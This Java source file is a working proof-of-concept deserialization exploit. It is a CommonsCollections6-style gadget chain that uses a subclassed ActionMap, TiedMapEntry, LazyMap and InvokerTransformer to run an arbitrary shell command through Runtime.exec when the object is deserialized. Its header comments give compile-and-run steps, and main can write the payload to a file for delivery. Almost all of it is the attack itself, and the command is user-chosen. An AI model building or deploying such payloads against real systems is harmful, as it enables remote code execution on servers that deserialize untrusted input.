/**
 * ActionMap + TiedMapEntry + LazyMap + InvokerTransformer (CC6-shaped).
 *
 * Why a subclass? ActionMap.writeObject → ArrayTable.writeArrayTable → get(key)
 * calls key.hashCode()/equals and detonates DURING SERIALIZE, caching LazyMap
 * so a later Deserialize is a no-op. PayloadActionMap writes fields directly and
 * triggers put/equals only in readObject.
 *
 *   cd tmpwork/gadget_test
 *   javac -cp commons-collections-3.2.1.jar ActionMapTiedMapGadget.java Deserialize.java
 *   java -cp ".:commons-collections-3.2.1.jar" ActionMapTiedMapGadget 'open -a Calculator' out.ser
 *   java -cp ".:commons-collections-3.2.1.jar" Deserialize out.ser
 */
import java.awt.event.ActionEvent;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Map;
import javax.swing.AbstractAction;
import javax.swing.Action;
import javax.swing.ActionMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

public class ActionMapTiedMapGadget {

    public static class DummyAction extends AbstractAction {
        private static final long serialVersionUID = 1L;

        @Override
        public void actionPerformed(ActionEvent e) {}
    }

    /**
     * Serializable entry. Superclass ActionMap.writeObject still runs (writes
     * empty ArrayTable). Our readObject then put()s TiedMapEntry + Map.Entry
     * to fire TiedMapEntry.equals → getValue → LazyMap.
     */
    public static class PayloadActionMap extends ActionMap {
        private static final long serialVersionUID = 1L;

        private TiedMapEntry entry;
        private Map.Entry<?, ?> probe;
        private Action action;

        PayloadActionMap(TiedMapEntry entry, Map.Entry<?, ?> probe, Action action) {
            this.entry = entry;
            this.probe = probe;
            this.action = action;
        }

        private void writeObject(ObjectOutputStream s) throws IOException {
            s.defaultWriteObject();
        }

        private void readObject(ObjectInputStream s)
            throws IOException, ClassNotFoundException {
            s.defaultReadObject();
            // Trigger: TiedMapEntry.equals(Map.Entry) → getValue → LazyMap#get
            put(entry, action);
            put(probe, action);
        }
    }

    public static Object createPayload(String command) throws Exception {
        final String[] execArgs = new String[] {command};

        Transformer[] real =
            new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                    "getMethod",
                    new Class[] {String.class, Class[].class},
                    new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer(
                    "invoke",
                    new Class[] {Object.class, Object[].class},
                    new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, execArgs),
                new ConstantTransformer(1),
            };

        ChainedTransformer chain =
            new ChainedTransformer(new Transformer[] {new ConstantTransformer(1)});
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "trigger");
        Map.Entry<?, ?> probe = new AbstractMap.SimpleEntry<Object, Object>("p", "v");
        Action filler = new DummyAction();

        setField(chain, "iTransformers", real);
        lazyMap.clear();

        return new PayloadActionMap(entry, probe, filler);
    }

    private static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    public static byte[] serialize(Object o) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(o);
        }
        return bos.toByteArray();
    }

    public static Object deserialize(byte[] data) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        }
    }

    public static void main(String[] args) throws Exception {
        String cmd;
        if (args.length > 0) {
            cmd = args[0];
        } else if (System.getProperty("os.name", "").toLowerCase().contains("mac")) {
            cmd = "open -a Calculator";
        } else {
            cmd = "/usr/bin/touch /tmp/actionmap_gadget_ok.txt";
        }

        System.out.println("[*] building payload, cmd=" + cmd);
        Object payload = createPayload(cmd);
        byte[] bytes = serialize(payload);
        System.out.println("[*] serialized " + bytes.length + " bytes (should NOT have fired yet)");

        if (args.length > 1) {
            Path out = Path.of(args[1]);
            Files.write(out, bytes);
            System.out.println("[*] wrote " + out.toAbsolutePath());
            System.out.println("[*] run: java -cp \".:commons-collections-3.2.1.jar\" Deserialize " + args[1]);
            return;
        }

        System.out.println("[*] deserializing (expect RCE)…");
        deserialize(bytes);
        System.out.println("[*] done");
    }
}
